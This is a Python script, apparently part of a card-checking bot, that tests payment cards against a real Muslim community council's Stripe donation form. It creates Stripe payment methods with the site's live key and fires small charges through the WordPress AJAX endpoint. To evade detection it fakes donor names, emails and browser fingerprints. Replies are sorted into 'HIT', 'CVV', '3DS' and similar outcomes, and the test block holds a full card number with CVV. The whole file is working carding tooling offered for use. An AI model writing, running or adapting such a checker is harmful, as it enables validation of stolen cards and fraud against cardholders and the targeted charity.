# gatet.py - Chestermeremuslimcouncil.com Stripe Gateway
import requests
import json
import time
import random
import uuid
import threading
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
success_keys = ["appreciate", "appreciated", "Payment Success", "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl", "succeeded", "confirmation", "Successful!", "Thanks!", "Successful", "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!", "donation", "complete"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "invalid"]
invalid_keys = ["Invalid account"]
declined_keys = ["cannot be processed", "CARD_DECLINED", "Your card was declined.", "generic_decline", "cannot process your order", "declined"]
cvv_keys = ["transaction_not_allowed", "Your card does not support this type of purchase", "do_not_honor"]
insufficient_keys = ["Your card has insufficient funds.", "INSUFFICIENT_FUNDS", "insufficient_funds", "Insufficient Funds", "Insufficient"]
payment_failed_keys = ["does not match the billing address"]
expired_keys = ["card has expired"]
incorrect_keys = ["card number is incorrect"]
manycc_keys = ["Too Many Requests"]
riskcc_keys = ["again in a little bit"]
otp_keys = ["Verifying", "action_required", "verifying", "call_next_method", "requires_source_action", "CompletePaymentChallenge", "requires_action", "additional action before completion!", "nextAction"]
cap_keys = ["reCaptcha"]
exceed_keys = ["exceeding its amount limit"]
proxyfailed_keys = ["Failed to perform"]

# Site storage for bot.py compatibility
_sites = []
_sites_lock = threading.Lock()


def classify_response(last):
    """Classify Stripe response status."""
    if not last:
        return "DEAD"
    last_lower = str(last).lower()
    if any(key.lower() in last_lower for key in success_keys): 
        return "HIT"
    if any(key.lower() in last_lower for key in ccn_keys): 
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys): 
        return "CVV"
    if any(key.lower() in last_lower for key in otp_keys): 
        return "3DS"
    if any(key.lower() in last_lower for key in insufficient_keys): 
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys): 
        return "EXPIRED"
    if any(key.lower() in last_lower for key in declined_keys): 
        return "DECLINED"
    return "DEAD"


# ========== HELPER FUNCTIONS ==========
def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    user_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(user_agents)

def gen_random_name():
    first_name = fake.first_name()
    last_name = fake.last_name()
    return first_name, last_name

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com"]
    random_num = random.randint(1000, 99999)
    email = f"{first_name.lower()}{random_num}{random.choice(domains)}"
    return email

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"


# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, gate: str = "ch1"):
    """
    Check credit card via chestermeremuslimcouncil.com
    Input: "card_number|month|year|cvv", gate (ignored for compatibility)
    Returns: (response_message, amount, gateway_name) - 3 values for bot.py
    """
    
    # Parse card details
    ccx = ccx.strip()
    parts = ccx.split("|")
    
    if len(parts) != 4:
        return "ERROR: Invalid format. Use: number|month|year|cvv", "1.00", "Stripe 1$"
    
    n, mm, yy, cvc = parts
    
    # Fix year format (2028 -> 28)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    # Amount based on gate (keeping compatibility)
    if gate == "ch1":
        charge_amount = "1"
    elif gate == "ch2":
        charge_amount = "5"
    elif gate == "ch3":
        charge_amount = "10"
    elif gate == "ch4":
        charge_amount = "25"
    elif gate == "ch5":
        charge_amount = "50"
    else:
        charge_amount = "1"
    
    gateway_name = f"Stripe {charge_amount}$"
    
    # Generate random customer data
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    
    # Generate random IDs for Stripe
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    
    # Stripe publishable key for chestermeremuslimcouncil.com
    stripe_key = "pk_live_51MNmlgIwvpZDYEf5RGmyHv6XIBFU2i0JUbDEI0hQPb7KTR8DbLcd8F7PYAjFdZjls6l2GRhAFFD2qk8THOjkCTA900P1hpPJjz"
    
    # Create session with cookies
    session = requests.Session()
    
    # Set cookies
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    # ========== STEP 1: Create Payment Method with Stripe API ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    # Build POST data string
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2Fd91f4a8494%3B+stripe-js-v3%2Fd91f4a8494%3B+card-element'
        f'&referrer=https%3A%2F%2Fchestermeremuslimcouncil.com'
        f'&time_on_page={random.randint(10000, 90000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': gen_random_user_agent(),
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
    
    # Check if payment method was created successfully
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:200])
            # Check for card errors
            if 'incorrect' in str(error_msg).lower() and 'number' in str(error_msg).lower():
                return f"CCN - Wrong card number", charge_amount, gateway_name
            if 'cvc' in str(error_msg).lower() or 'cvv' in str(error_msg).lower():
                return f"CVV - Wrong CVV", charge_amount, gateway_name
            if 'expired' in str(error_msg).lower():
                return f"EXPIRED - Card expired", charge_amount, gateway_name
            if 'insufficient' in str(error_msg).lower():
                return f"INSUFFICIENT - Insufficient funds", charge_amount, gateway_name
            return f"STRIPE_ERROR: {error_msg}", charge_amount, gateway_name
        except:
            return f"STRIPE_ERROR: {response.text[:200]}", charge_amount, gateway_name
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            error_msg = response_json.get('error', {}).get('message', response.text[:200])
            return f"STRIPE_ERROR: {error_msg}", charge_amount, gateway_name
        payment_method_id = response_json['id']
    except Exception as e:
        return f"JSON_PARSE_ERROR: {str(e)}", charge_amount, gateway_name
    
    # ========== STEP 2: Charge via WordPress Admin AJAX ==========
    url_wp = "https://chestermeremuslimcouncil.com/wp-admin/admin-ajax.php"
    
    wp_data = {
        'action': 'wp_full_stripe_inline_donation_charge',
        'wpfs-form-name': 'Donation',
        'wpfs-form-get-parameters': '{}',
        'wpfs-custom-amount': 'other',
        'wpfs-custom-amount-unique': charge_amount,
        'wpfs-donation-frequency': 'one-time',
        'wpfs-card-holder-email': email,
        'wpfs-card-holder-name': full_name,
        'wpfs-stripe-payment-method-id': payment_method_id,
    }
    
    headers_wp = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://chestermeremuslimcouncil.com',
        'Referer': 'https://chestermeremuslimcouncil.com/donate/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': gen_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    try:
        r2 = session.post(url_wp, data=wp_data, headers=headers_wp, timeout=30)
    except requests.exceptions.RequestException as e:
        return f"WP_NETWORK_ERROR: {str(e)}", charge_amount, gateway_name
    
    # Parse response
    try:
        response_json = r2.json()
        message = response_json.get('message', r2.text)
        success = response_json.get('success', False)
        
        # If success is True or message contains success keywords
        if success:
            return f"HIT - {message}", charge_amount, gateway_name
        
        # Classify the response
        status = classify_response(message)
        
        if status == "HIT":
            return f"HIT - {message}", charge_amount, gateway_name
        elif status == "CCN":
            return f"CCN - Wrong card number", charge_amount, gateway_name
        elif status == "CVV":
            return f"CVV - Wrong CVV", charge_amount, gateway_name
        elif status == "3DS":
            return f"3DS - 3D Secure Required", charge_amount, gateway_name
        elif status == "INSUFFICIENT":
            return f"INSUFFICIENT - Insufficient funds", charge_amount, gateway_name
        elif status == "EXPIRED":
            return f"EXPIRED - Card expired", charge_amount, gateway_name
        elif status == "DECLINED":
            return f"DECLINED - {message[:100]}", charge_amount, gateway_name
        else:
            return f"DEAD - {message[:100]}", charge_amount, gateway_name
            
    except json.JSONDecodeError:
        # If response is not JSON
        r2_text = r2.text
        status = classify_response(r2_text)
        
        if status == "HIT":
            return f"HIT - {r2_text[:100]}", charge_amount, gateway_name
        elif "thank" in r2_text.lower() or "appreciate" in r2_text.lower():
            return f"HIT - {r2_text[:100]}", charge_amount, gateway_name
        else:
            return f"DEAD - {r2_text[:100]}", charge_amount, gateway_name


def reload_sites():
    """Load sites from site.txt (compatibility for bot.py)."""
    global _sites
    try:
        with open("site.txt", "r") as f:
            sites = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    except FileNotFoundError:
        sites = ["chestermeremuslimcouncil.com"]
    
    with _sites_lock:
        _sites = sites
    return sites


def get_site_status():
    """Get status of sites (compatibility for bot.py)."""
    global _sites
    if not _sites:
        reload_sites()
    return {
        'total': len(_sites),
        'alive': len(_sites),
        'dead': 0,
        'dead_list': []
    }


# ========== TEST FUNCTION ==========
if __name__ == "__main__":
    print("=" * 60)
    print("Chestermeremuslimcouncil.com Stripe Checker")
    print("=" * 60)
    
    # Test card
    test_card = "5299501713701866|12|28|489"
    
    print(f"\n[+] Testing: {test_card}")
    print("[+] Gateway: chestermeremuslimcouncil.com")
    print("-" * 60)
    
    result, amount, gateway = Tele(test_card, "ch1")
    
    print(f"Result: {result}")
    print(f"Amount: ${amount}")
    print(f"Gateway: {gateway}")
    print("=" * 60)
